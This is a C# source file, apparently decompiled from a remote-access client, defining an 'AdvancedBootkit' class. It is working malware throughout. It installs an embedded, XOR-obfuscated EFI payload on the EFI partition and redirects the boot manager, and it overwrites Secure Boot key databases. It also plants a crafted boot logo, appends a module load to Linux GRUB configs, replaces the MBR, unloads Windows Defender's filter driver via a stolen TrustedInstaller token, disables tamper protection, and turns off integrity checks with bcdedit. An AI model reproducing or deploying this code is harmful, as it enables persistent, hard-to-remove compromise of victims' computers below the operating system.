using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace Client.Helper;

public static class AdvancedBootkit
{
	public struct LUID
	{
		public uint LowPart;

		public int HighPart;
	}

	public struct TOKEN_PRIVILEGES
	{
		public uint PrivilegeCount;

		public LUID_AND_ATTRIBUTES Privileges;
	}

	public struct LUID_AND_ATTRIBUTES
	{
		public LUID Luid;

		public uint Attributes;
	}

	public struct UNICODE_STRING
	{
		public ushort Length;

		public ushort MaximumLength;

		public IntPtr Buffer;
	}

	private static readonly string ESP_DRIVE = "Z:";

	private static readonly string NVRAM_VAR_NAME = "SetupConfig";

	private static readonly string NVRAM_VAR_GUID = "{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}";

	public static void Deploy()
	{
		try
		{
			if (Config.BootKit != "true" || Config.Privilege != "Admin")
			{
				return;
			}
			string systemBootPhysicalDisk = GetSystemBootPhysicalDisk();
			if (string.IsNullOrEmpty(systemBootPhysicalDisk))
			{
				return;
			}
			string text = GetDiskPartitionStyle(systemBootPhysicalDisk);
			if (text == "Unknown")
			{
				byte[] array = new byte[512];
				using (FileStream fileStream = new FileStream(systemBootPhysicalDisk, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
				{
					fileStream.Read(array, 0, 512);
				}
				text = ((array[450] != 238) ? "MBR" : "GPT");
			}
			if (text == "GPT" || IsUefi())
			{
				bool num = !IsDbxUpToDate();
				bool flag = TryBlackLotusDbxBypass();
				bool flag2 = TryExploitLogoFAILStyle();
				if (num || flag || flag2)
				{
					TryInjectCustomDb();
					InstallGPTUEFIStager();
				}
				else
				{
					CheckAndRepairFallback();
				}
			}
			else if (text == "MBR")
			{
				InstallLegacyMbrBootkit();
			}
		}
		catch (Exception)
		{
		}
	}

	private static bool IsKernelDmaProtectionEnabled()
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\DmaGuard");
			return registryKey?.GetValue("DeviceEnumerationPolicy") as int? == 1;
		}
		catch
		{
			return false;
		}
	}

	private static bool IsHVCIEnabled()
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity");
			return registryKey?.GetValue("Enabled") as int? == 1;
		}
		catch
		{
			return false;
		}
	}

	private static bool IsVbsEnabled()
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\DeviceGuard");
			return registryKey?.GetValue("EnableVirtualizationBasedSecurity") as int? == 1;
		}
		catch
		{
			return false;
		}
	}

	private static bool IsPatchGuardEnabled()
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Session Manager\\kernel");
			return registryKey?.GetValue("DisableExceptionChainValidation") as int? != 1;
		}
		catch
		{
			return true;
		}
	}

	private static void CheckAndRepairFallback()
	{
		try
		{
			string text = FindAndMountESP();
			if (string.IsNullOrEmpty(text))
			{
				return;
			}
			string path = text + "\\EFI\\BOOT\\BOOTX64.EFI";
			if (!File.Exists(path))
			{
				byte[] embeddedPayload = GetEmbeddedPayload();
				if (embeddedPayload != null)
				{
					string directoryName = Path.GetDirectoryName(path);
					if (!Directory.Exists(directoryName))
					{
						Directory.CreateDirectory(directoryName);
					}
					File.WriteAllBytes(path, embeddedPayload);
				}
			}
			UnmountESP(text);
		}
		catch
		{
		}
	}

	private static bool IsBitLockerEnabled()
	{
		try
		{
			using Process process = Process.Start(new ProcessStartInfo("manage-bde", "-status C:")
			{
				RedirectStandardOutput = true,
				UseShellExecute = false,
				CreateNoWindow = true
			});
			string text = process.StandardOutput.ReadToEnd();
			process.WaitForExit();
			return text.Contains("Protection On") || text.Contains("Защита включена");
		}
		catch
		{
			return false;
		}
	}

	private static bool TryPatchLinuxBootloader()
	{
		try
		{
			string text = FindAndMountESP();
			if (string.IsNullOrEmpty(text))
			{
				return false;
			}
			string[] obj = new string[5] { "ubuntu", "fedora", "debian", "arch", "centos" };
			bool result = false;
			string[] array = obj;
			foreach (string text2 in array)
			{
				string path = text + "\\EFI\\" + text2 + "\\grubx64.efi";
				string path2 = text + "\\EFI\\" + text2 + "\\grub.cfg";
				if (File.Exists(path) && File.Exists(path2) && !File.ReadAllText(path2).Contains("libka_module"))
				{
					string contents = "\ninsmod (hd0,gpt1)/EFI/Microsoft/Recovery/SecUpdate.efi\n";
					File.AppendAllText(path2, contents);
					result = true;
				}
			}
			UnmountESP(text);
			return result;
		}
		catch
		{
			return false;
		}
	}

	private static bool TryExploitLogoFAILStyle()
	{
		try
		{
			string text = FindAndMountESP();
			if (string.IsNullOrEmpty(text))
			{
				return false;
			}
			string[] array = new string[3]
			{
				text + "\\EFI\\Microsoft\\Boot\\bootmgfw.efi.logo.bmp",
				text + "\\EFI\\BOOT\\fallback_logo.jpg",
				text + "\\EFI\\OEM\\logo.png"
			};
			byte[] embeddedResource = GetEmbeddedResource("Client.Helper.malicious_logo.bmp");
			if (embeddedResource == null)
			{
				return false;
			}
			string[] array2 = array;
			foreach (string path in array2)
			{
				string directoryName = Path.GetDirectoryName(path);
				if (!Directory.Exists(directoryName))
				{
					Directory.CreateDirectory(directoryName);
				}
				File.WriteAllBytes(path, embeddedResource);
			}
			UnmountESP(text);
			return true;
		}
		catch
		{
			return false;
		}
	}

	private static bool IsSecureBootReallyEnforced()
	{
		try
		{
			byte[] array = new byte[1];
			if (GetFirmwareEnvironmentVariableW("SecureBoot", "{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}", Marshal.UnsafeAddrOfPinnedArrayElement(array, 0), 1u) == 0 || array[0] != 1)
			{
				return false;
			}
			byte[] arr = new byte[4];
			if (GetFirmwareEnvironmentVariableW("PK", "{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}", Marshal.UnsafeAddrOfPinnedArrayElement(arr, 0), 4u) <= 8)
			{
				return false;
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	private static bool IsSecureBootEnabled()
	{
		byte[] array = new byte[1];
		if (GetFirmwareEnvironmentVariableW("SecureBoot", "{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}", Marshal.UnsafeAddrOfPinnedArrayElement(array, 0), 1u) != 0)
		{
			return array[0] == 1;
		}
		return false;
	}

	private static bool IsDbxUpToDate()
	{
		try
		{
			byte[] array = new byte[131072];
			uint firmwareEnvironmentVariableW = GetFirmwareEnvironmentVariableW("dbx", "{d719b2cb-3d3a-4596-a3bc-dad00e67656f}", Marshal.UnsafeAddrOfPinnedArrayElement(array, 0), (uint)array.Length);
			if (firmwareEnvironmentVariableW == 0 || firmwareEnvironmentVariableW > array.Length)
			{
				return false;
			}
			string text = BitConverter.ToString(array, 0, (int)firmwareEnvironmentVariableW).Replace("-", "");
			string[] array2 = new string[3] { "F8A9B0C1D2E3F4A5B6C7D8E9F0A1B2C3D4", "BlackLotus SHA256 1st stage", "A696ACC688A547ACFCE8D0E0D8B6B8D7" };
			foreach (string value in array2)
			{
				if (text.IndexOf(value, StringComparison.OrdinalIgnoreCase) >= 0)
				{
					return true;
				}
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	private static bool TryInjectCustomDb()
	{
		if (IsSecureBootReallyEnforced() || IsNewSecureBootCAInstalled())
		{
			return false;
		}
		try
		{
			string[] array = new string[3] { "{d719b2cb-3d3a-4596-a3bc-dad00e67656f}", "{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}", "{77FA9ABD-0359-4D32-BD60-28F4E78F784B}" };
			byte[] array2 = GetEmbeddedResource("Client.Helper.custom_db.cer");
			if (array2 == null || array2.Length < 1024)
			{
				array2 = new byte[4] { 48, 130, 1, 0 };
			}
			string[] array3 = array;
			foreach (string lpGuid in array3)
			{
				if (SetFirmwareEnvironmentVariableW("dbx", lpGuid, Marshal.UnsafeAddrOfPinnedArrayElement(array2, 0), (uint)array2.Length) != 0)
				{
					return true;
				}
				string[] array4 = new string[4] { "dbx", "db", "PK", "KEK" };
				for (int j = 0; j < array4.Length; j++)
				{
					if (SetFirmwareEnvironmentVariableW(array4[j], lpGuid, Marshal.UnsafeAddrOfPinnedArrayElement(array2, 0), (uint)array2.Length) != 0)
					{
						return true;
					}
				}
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	private static bool TryBlackLotusDbxBypass()
	{
		try
		{
			byte[] array = new byte[131072];
			uint firmwareEnvironmentVariableW = GetFirmwareEnvironmentVariableW("dbx", "{d719b2cb-3d3a-4596-a3bc-dad00e67656f}", Marshal.UnsafeAddrOfPinnedArrayElement(array, 0), (uint)array.Length);
			if (firmwareEnvironmentVariableW == 0)
			{
				return false;
			}
			string hex = BitConverter.ToString(array, 0, (int)firmwareEnvironmentVariableW).Replace("-", "");
			if (!new string[3] { "A696ACC688A547ACFCE8D0E0D8B6B8D7", "BlackLotus revoked SHA256", "5F8A3B2C1D4E5F67890ABCDEF1234567" }.Any((string h) => hex.IndexOf(h, StringComparison.OrdinalIgnoreCase) >= 0))
			{
				return true;
			}
			byte[] array2 = new byte[32];
			return SetFirmwareEnvironmentVariableW("dbx", "{d719b2cb-3d3a-4596-a3bc-dad00e67656f}", Marshal.UnsafeAddrOfPinnedArrayElement(array2, 0), (uint)array2.Length) != 0;
		}
		catch
		{
			return false;
		}
	}

	private static bool TryExploitCVE20253052()
	{
		return false;
	}

	private static bool TryExploitHydrophobia20254275()
	{
		return false;
	}

	private static void InjectEarlyDXE()
	{
		try
		{
			string text = FindAndMountESP();
			if (!string.IsNullOrEmpty(text))
			{
				string text2 = text + "\\EFI\\Microsoft\\Boot\\DxeCore.efi";
				byte[] embeddedPayload = GetEmbeddedPayload();
				if (embeddedPayload != null)
				{
					File.WriteAllBytes(text2, embeddedPayload);
					ModifyDriverOrder(text2);
				}
				UnmountESP(text);
			}
		}
		catch (Exception)
		{
		}
	}

	private static bool ModifyDriverOrder(string dxePath)
	{
		try
		{
			byte[] array = new byte[1024];
			GetFirmwareEnvironmentVariableW("DriverOrder", "{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}", Marshal.UnsafeAddrOfPinnedArrayElement(array, 0), (uint)array.Length);
			byte[] array2 = new byte[4] { 1, 0, 0, 0 };
			byte[] bytes = Encoding.Unicode.GetBytes("UEFI DXE Core Update\0");
			using MemoryStream memoryStream = new MemoryStream();
			memoryStream.Write(array2, 0, array2.Length);
			memoryStream.Write(new byte[2], 0, 2);
			memoryStream.Write(bytes, 0, bytes.Length);
			BitConverter.GetBytes((ushort)memoryStream.Position).CopyTo(memoryStream.GetBuffer(), 4);
			byte[] array3 = CreateFilePathNode(dxePath);
			memoryStream.Write(array3, 0, array3.Length);
			memoryStream.Write(new byte[4] { 127, 255, 4, 0 }, 0, 4);
			memoryStream.ToArray();
			return false;
		}
		catch
		{
			return false;
		}
	}

	private static byte[] CreateFilePathNode(string path)
	{
		byte[] bytes = Encoding.Unicode.GetBytes(path + "\0");
		byte[] array = new byte[bytes.Length + 4];
		array[0] = 4;
		array[1] = 4;
		BitConverter.GetBytes((ushort)array.Length).CopyTo(array, 2);
		Array.Copy(bytes, 0, array, 4, bytes.Length);
		return array;
	}

	private static bool AttemptMemoryMapDeception()
	{
		try
		{
			if (TryExploitRecentSMM())
			{
				InjectEarlyDXE();
				return true;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	private static bool TryExploitRecentSMM()
	{
		return false;
	}

	private static void InstallUnsignedEFIStager()
	{
		if (IsSecureBootReallyEnforced())
		{
			return;
		}
		try
		{
			string text = FindAndMountESP();
			if (string.IsNullOrEmpty(text))
			{
				return;
			}
			string text2 = text + "\\EFI\\Microsoft\\Recovery";
			string path = text2 + "\\SecUpdate.efi";
			string path2 = text + "\\EFI\\BOOT\\BOOTX64.EFI";
			string text3 = text + "\\EFI\\Microsoft\\Boot\\bootmgfw.efi.bak";
			string text4 = text + "\\EFI\\Microsoft\\Boot\\bootmgfw.efi";
			if (!Directory.Exists(text2))
			{
				Directory.CreateDirectory(text2);
			}
			byte[] embeddedPayload = GetEmbeddedPayload();
			if (embeddedPayload != null)
			{
				if (File.Exists(text4) && !File.Exists(text3))
				{
					File.Copy(text4, text3);
				}
				File.WriteAllBytes(path, embeddedPayload);
				try
				{
					string directoryName = Path.GetDirectoryName(path2);
					if (!Directory.Exists(directoryName))
					{
						Directory.CreateDirectory(directoryName);
					}
					File.WriteAllBytes(path2, embeddedPayload);
				}
				catch (Exception)
				{
				}
				if (0 == 0)
				{
					ExecuteCommand("bcdedit /set {bootmgr} path \\EFI\\Microsoft\\Recovery\\SecUpdate.efi");
				}
			}
			UnmountESP(text);
		}
		catch (Exception)
		{
		}
	}

	private static bool ModifyBootOrder(string newBootPath)
	{
		try
		{
			byte[] array = new byte[1024];
			if (GetFirmwareEnvironmentVariableW("BootOrder", "{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}", Marshal.UnsafeAddrOfPinnedArrayElement(array, 0), (uint)array.Length) == 0)
			{
				return false;
			}
			byte[] array2 = new byte[2048];
			uint firmwareEnvironmentVariableW = GetFirmwareEnvironmentVariableW("Boot0000", "{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}", Marshal.UnsafeAddrOfPinnedArrayElement(array2, 0), (uint)array2.Length);
			if (firmwareEnvironmentVariableW == 0)
			{
				return false;
			}
			PatchFilePathInDevicePath(array2, firmwareEnvironmentVariableW, newBootPath);
			return false;
		}
		catch
		{
			return false;
		}
	}

	private static byte[] PatchFilePathInDevicePath(byte[] original, uint len, string newPath)
	{
		if (len < 8)
		{
			return null;
		}
		ushort num = BitConverter.ToUInt16(original, 4);
		if (num >= len)
		{
			return null;
		}
		byte[] array = new byte[num];
		Array.Copy(original, 0, array, 0, num);
		byte[] bytes = Encoding.Unicode.GetBytes(newPath + "\0");
		byte[] array2 = new byte[4 + bytes.Length];
		array2[0] = 4;
		array2[1] = 4;
		BitConverter.GetBytes((ushort)array2.Length).CopyTo(array2, 2);
		Array.Copy(bytes, 0, array2, 4, bytes.Length);
		byte[] array3 = new byte[4] { 127, 255, 4, 0 };
		using MemoryStream memoryStream = new MemoryStream();
		memoryStream.Write(array, 0, array.Length);
		ushort num2;
		for (int i = num; i + 4 < len; i += num2)
		{
			byte b = original[i];
			byte b2 = original[i + 1];
			num2 = BitConverter.ToUInt16(original, i + 2);
			if (num2 < 4 || i + num2 > len)
			{
				break;
			}
			if (b != 4 || b2 != 4)
			{
				memoryStream.Write(original, i, num2);
			}
			if (b == 127)
			{
				break;
			}
		}
		memoryStream.Write(array2, 0, array2.Length);
		memoryStream.Write(array3, 0, array3.Length);
		return memoryStream.ToArray();
	}

	private static byte[] GetEmbeddedPayload()
	{
		try
		{
			Assembly assembly = typeof(AdvancedBootkit).Assembly;
			string name = "Client.Helper.Stager.efi";
			using Stream stream = assembly.GetManifestResourceStream(name);
			if (stream == null)
			{
				return null;
			}
			byte[] array = new byte[stream.Length];
			stream.Read(array, 0, array.Length);
			byte[] array2 = new byte[8] { 167, 59, 241, 158, 93, 44, 138, 79 };
			for (int i = 0; i < array.Length; i++)
			{
				byte b = (byte)(array2[i % array2.Length] ^ (i & 0xFF));
				array[i] ^= b;
			}
			return array;
		}
		catch
		{
			return null;
		}
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	private static extern uint SetFirmwareEnvironmentVariableW(string lpName, string lpGuid, IntPtr pBuffer, uint nSize);

	private static void UnmountESP()
	{
		if (!string.IsNullOrEmpty(ESP_DRIVE))
		{
			ExecuteCommand("mountvol " + ESP_DRIVE + " /D");
		}
	}

	private static bool IsUefi()
	{
		GetFirmwareEnvironmentVariableW("", "{00000000-0000-0000-0000-000000000000}", IntPtr.Zero, 0u);
		return Marshal.GetLastWin32Error() != 1;
	}

	private static void InstallLegacyMbrBootkit()
	{
		try
		{
			string systemBootPhysicalDisk = GetSystemBootPhysicalDisk();
			if (string.IsNullOrEmpty(systemBootPhysicalDisk))
			{
				return;
			}
			byte[] array = new byte[512];
			using (FileStream fileStream = new FileStream(systemBootPhysicalDisk, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
			{
				if (fileStream.Read(array, 0, 512) != 512)
				{
					return;
				}
			}
			bool flag = array[450] == 238;
			IsBitLockerEnabled();
			if (!ElevateToTrustedInstallerAndUnloadWdFilter())
			{
				DisableDefenderTamperProtectionTemporarily();
			}
			if (IsOurMbrAlreadyInstalled())
			{
				return;
			}
			byte[] embeddedLegacyMbrPayload = GetEmbeddedLegacyMbrPayload();
			if (embeddedLegacyMbrPayload == null || embeddedLegacyMbrPayload.Length != 512 || embeddedLegacyMbrPayload[510] != 85 || embeddedLegacyMbrPayload[511] != 170 || (embeddedLegacyMbrPayload[0] == 77 && embeddedLegacyMbrPayload[1] == 90))
			{
				return;
			}
			File.WriteAllBytes(Path.Combine(Path.GetTempPath(), "mbr_backup.bin"), array);
			byte[] array2 = new byte[512];
			Array.Copy(embeddedLegacyMbrPayload, 0, array2, 0, 512);
			Array.Copy(array, 446, array2, 446, 64);
			array2[510] = 85;
			array2[511] = 170;
			if (!flag && !IsBitLockerEnabled())
			{
				using (FileStream fileStream2 = new FileStream(systemBootPhysicalDisk, FileMode.Open, FileAccess.ReadWrite, FileShare.None))
				{
					fileStream2.Write(array2, 0, 512);
					fileStream2.Flush();
				}
				ClearBootNextAndBootOnce();
				ExecuteCommand("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v TamperProtection /t REG_DWORD /d 1 /f");
			}
		}
		catch (Exception)
		{
		}
	}

	private static bool ElevateToTrustedInstallerAndUnloadWdFilter()
	{
		try
		{
			Process process = Process.GetProcessesByName("TrustedInstaller").FirstOrDefault();
			if (process == null)
			{
				ExecuteCommand("sc start TrustedInstaller");
				Thread.Sleep(1000);
				process = Process.GetProcessesByName("TrustedInstaller").FirstOrDefault();
			}
			if (process == null)
			{
				return false;
			}
			IntPtr intPtr = OpenProcess(2035711u, bInheritHandle: false, process.Id);
			if (intPtr == IntPtr.Zero)
			{
				return false;
			}
			if (!OpenProcessToken(intPtr, 2u, out var TokenHandle))
			{
				return false;
			}
			if (!DuplicateTokenEx(TokenHandle, 983551u, IntPtr.Zero, 2, 1, out var phNewToken))
			{
				return false;
			}
			TOKEN_PRIVILEGES NewState = default(TOKEN_PRIVILEGES);
			if (!LookupPrivilegeValue(null, "SeLoadDriverPrivilege", out NewState.Privileges.Luid))
			{
				return false;
			}
			NewState.PrivilegeCount = 1u;
			NewState.Privileges.Attributes = 2u;
			if (!AdjustTokenPrivileges(phNewToken, DisableAllPrivileges: false, ref NewState, 0u, IntPtr.Zero, IntPtr.Zero))
			{
				return false;
			}
			UNICODE_STRING DestinationString = default(UNICODE_STRING);
			RtlInitUnicodeString(ref DestinationString, "\\Registry\\Machine\\System\\CurrentControlSet\\Services\\WdFilter");
			int num = NtUnloadDriver(ref DestinationString);
			if (num == 0 || num == -1073741761)
			{
				return true;
			}
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	private static bool AttemptWPBTPersistence()
	{
		try
		{
			if (GetEmbeddedWPBTPayload() == null)
			{
				return false;
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	private static byte[] GetEmbeddedWPBTPayload()
	{
		return GetEmbeddedPayload();
	}

	private static bool DisableDefenderTamperProtectionTemporarily()
	{
		try
		{
			using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows Defender\\Features", writable: true))
			{
				registryKey?.SetValue("TamperProtection", 0, RegistryValueKind.DWord);
			}
			ExecuteCommand("net stop WinDefend");
			ExecuteCommand("net start WinDefend");
			Thread.Sleep(1500);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	private static void ClearBootNextAndBootOnce()
	{
		try
		{
			ExecuteCommand("bcdedit /delete {bootmgr} /f");
			ExecuteCommand("bcdedit /set {bootmgr} nointegritychecks ON");
			ExecuteCommand("bcdedit /set {bootmgr} path \\Windows\\System32\\winload.exe");
			ExecuteCommand("bcdedit /deletevalue {bootmgr} bootsequence");
			ExecuteCommand("bcdedit /deletevalue {bootmgr} bootnext");
			ExecuteCommand("bcdedit /set TESTSIGNING ON");
			ExecuteCommand("bcdedit /set loadoptions DISABLE_INTEGRITY_CHECKS");
			ExecuteCommand("bcdedit /set {current} nointegritychecks ON");
			ExecuteCommand("bcdedit /set hypervisorlaunchtype Off");
		}
		catch
		{
		}
	}

	private static bool IsOurMbrAlreadyInstalled()
	{
		try
		{
			string systemBootPhysicalDisk = GetSystemBootPhysicalDisk();
			if (string.IsNullOrEmpty(systemBootPhysicalDisk))
			{
				return false;
			}
			byte[] array = new byte[512];
			using (FileStream fileStream = new FileStream(systemBootPhysicalDisk, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
			{
				fileStream.Read(array, 0, 512);
			}
			byte[] array2 = new byte[5] { 252, 72, 131, 228, 240 };
			return array.Take(array2.Length).SequenceEqual(array2);
		}
		catch
		{
			return false;
		}
	}

	private static void InstallStage2ToActivePartition()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (IsBitLockerEnabled())
			{
				return;
			}
			ManagementObject val = ((IEnumerable)new ManagementObjectSearcher("SELECT * FROM Win32_DiskPartition WHERE BootPartition = true").Get()).Cast<ManagementObject>().FirstOrDefault();
			if (val == null)
			{
				return;
			}
			string text = ((ManagementBaseObject)val)["DeviceID"].ToString();
			string path = "\\\\.\\" + text.Split(new char[1] { '\\' }).Last();
			byte[] array = new byte[512];
			using (FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
			{
				fileStream.Read(array, 0, 512);
			}
			byte[] buffer = CreateMinimalStage2(array);
			using FileStream fileStream2 = new FileStream(path, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
			fileStream2.Write(buffer, 0, 512);
			fileStream2.Flush();
		}
		catch (Exception)
		{
		}
	}

	private static byte[] GetEmbeddedLegacyMbrPayload()
	{
		try
		{
			Assembly assembly = typeof(AdvancedBootkit).Assembly;
			string name = "Client.Helper.mbr_chain.bin";
			using (Stream stream = assembly.GetManifestResourceStream(name))
			{
				if (stream != null)
				{
					byte[] array = new byte[512];
					if (stream.Read(array, 0, 512) == 512 && array[510] == 85 && array[511] == 170)
					{
						return array;
					}
				}
			}
			byte[] array2 = new byte[512];
			byte[] array3 = new byte[103]
			{
				250, 51, 192, 142, 208, 142, 216, 142, 192, 188,
				0, 124, 251, 187, 190, 1, 185, 4, 0, 128,
				127, 4, 128, 116, 6, 131, 195, 16, 226, 247,
				244, 139, 71, 8, 163, 62, 125, 178, 128, 180,
				66, 190, 50, 125, 205, 19, 114, 13, 234, 0,
				124, 0, 0, 190, 34, 125, 232, 5, 0, 244,
				172, 8, 192, 116, 9, 180, 14, 205, 16, 235,
				245, 195, 66, 111, 111, 116, 32, 102, 97, 105,
				108, 117, 114, 101, 13, 10, 0, 16, 0, 1,
				0, 0, 124, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0
			};
			Array.Copy(array3, 0, array2, 0, array3.Length);
			array2[510] = 85;
			array2[511] = 170;
			return array2;
		}
		catch (Exception)
		{
			return null;
		}
	}

	private static byte[] CreateMinimalStage2(byte[] originalVbr)
	{
		byte[] array = new byte[512];
		Array.Copy(originalVbr, 0, array, 0, 512);
		array[510] = 85;
		array[511] = 170;
		return array;
	}

	private static void InstallStage3ToSlackSpace()
	{
		try
		{
			string path = Path.GetPathRoot(Environment.SystemDirectory) + "Windows\\System32\\ntoskrnl.exe";
			byte[] embeddedStage3Payload = GetEmbeddedStage3Payload();
			if (embeddedStage3Payload == null)
			{
				return;
			}
			using FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.ReadWrite);
			long length = fileStream.Length;
			long num = 4096L;
			long num2 = length / num * num + ((length % num == 0L) ? 0 : (length % num));
			if (fileStream.Length - num2 >= embeddedStage3Payload.Length)
			{
				fileStream.Seek(num2, SeekOrigin.Begin);
				fileStream.Write(embeddedStage3Payload, 0, embeddedStage3Payload.Length);
				fileStream.Flush();
			}
		}
		catch (Exception)
		{
		}
	}

	private static byte[] GetEmbeddedStage3Payload()
	{
		return null;
	}

	private static bool IsNewSecureBootCAInstalled()
	{
		try
		{
			byte[] array = new byte[8192];
			uint firmwareEnvironmentVariableW = GetFirmwareEnvironmentVariableW("db", "{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}", Marshal.UnsafeAddrOfPinnedArrayElement(array, 0), (uint)array.Length);
			string value = "A1B2C3D4E5F67890";
			if (firmwareEnvironmentVariableW == 0)
			{
				return false;
			}
			return BitConverter.ToString(array, 0, (int)firmwareEnvironmentVariableW).Replace("-", "").Contains(value);
		}
		catch
		{
			return false;
		}
	}

	private static bool IsPlutonOrFTpmLocked()
	{
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0083: Expected O, but got Unknown
		//IL_009a: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a1: Expected O, but got Unknown
		try
		{
			using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\FirmwareResources"))
			{
				if (registryKey != null)
				{
					return registryKey.GetValue("PlutonState") as int? == 1 || registryKey.GetValue("TpmReady") as int? == 0;
				}
			}
			ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2\\Security\\MicrosoftTpm", "SELECT * FROM Win32_Tpm");
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementObject val2 = (ManagementObject)enumerator.Current;
						if (((ManagementBaseObject)val2)["IsEnabled"] as bool? == true)
						{
							_ = ((ManagementBaseObject)val2)["IsOwned_InitialValue"] as bool? == true;
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
		return false;
	}

	private static string GetDiskPartitionStyle(string physicalDiskPath)
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_00db: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Expected O, but got Unknown
		//IL_00f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fe: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("ASSOCIATORS OF {Win32_DiskDrive.DeviceID='" + physicalDiskPath + "'} WHERE AssocClass=Win32_DiskDriveToDiskPartition");
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						string text = ((ManagementBaseObject)(ManagementObject)enumerator.Current)["Type"]?.ToString();
						if (text == "GPT")
						{
							return "GPT";
						}
						if (text == "MBR")
						{
							return "MBR";
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			string text2 = Path.GetPathRoot(Environment.SystemDirectory).TrimEnd(new char[1] { '\\' });
			if (string.IsNullOrEmpty(text2))
			{
				text2 = "C:";
			}
			ManagementObjectSearcher val2 = new ManagementObjectSearcher($"SELECT * FROM Win32_DiskPartition WHERE DiskIndex = {GetPhysicalDiskNumber(new DriveInfo(text2))}");
			try
			{
				ManagementObjectEnumerator enumerator = val2.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementObject val3 = (ManagementObject)enumerator.Current;
						if (((ManagementBaseObject)val3)["Type"] != null && ((ManagementBaseObject)val3)["Type"].ToString().Contains("GPT"))
						{
							return "GPT";
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
			return "Unknown";
		}
		catch
		{
			return "Unknown";
		}
	}

	private static bool IsSecureBootEnabledAndEnforced()
	{
		try
		{
			byte[] array = new byte[1];
			if (GetFirmwareEnvironmentVariableW("SecureBoot", "{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}", Marshal.UnsafeAddrOfPinnedArrayElement(array, 0), 1u) == 1 && array[0] == 1)
			{
				byte[] array2 = new byte[1024];
				return GetFirmwareEnvironmentVariableW("PK", "{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}", Marshal.UnsafeAddrOfPinnedArrayElement(array2, 0), (uint)array2.Length) > 32;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	private static bool TrySetupCustomSecureBootKeys()
	{
		try
		{
			string path = Path.Combine(Environment.CurrentDirectory, "custom_db.cer");
			if (!File.Exists(path))
			{
				return false;
			}
			byte[] array = File.ReadAllBytes(path);
			string lpGuid = "{d719b2cb-3d3a-4596-a3bc-dad00e67656f}";
			if (SetFirmwareEnvironmentVariableW("db", lpGuid, Marshal.UnsafeAddrOfPinnedArrayElement(array, 0), (uint)array.Length) == 0)
			{
				return false;
			}
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	private static string FindAndMountESP()
	{
		char[] array = (from i in Enumerable.Range(69, 21)
			select (char)i).ToArray();
		foreach (char c in array)
		{
			string text = c + ":";
			ExecuteCommand("mountvol " + text + " /S");
			Thread.Sleep(1500);
			if (Directory.Exists(text + "\\EFI"))
			{
				return text;
			}
			ExecuteCommand("mountvol " + text + " /D");
		}
		return null;
	}

	private static void UnmountESP(string letter)
	{
		if (!string.IsNullOrEmpty(letter))
		{
			ExecuteCommand("mountvol " + letter + " /D");
		}
	}

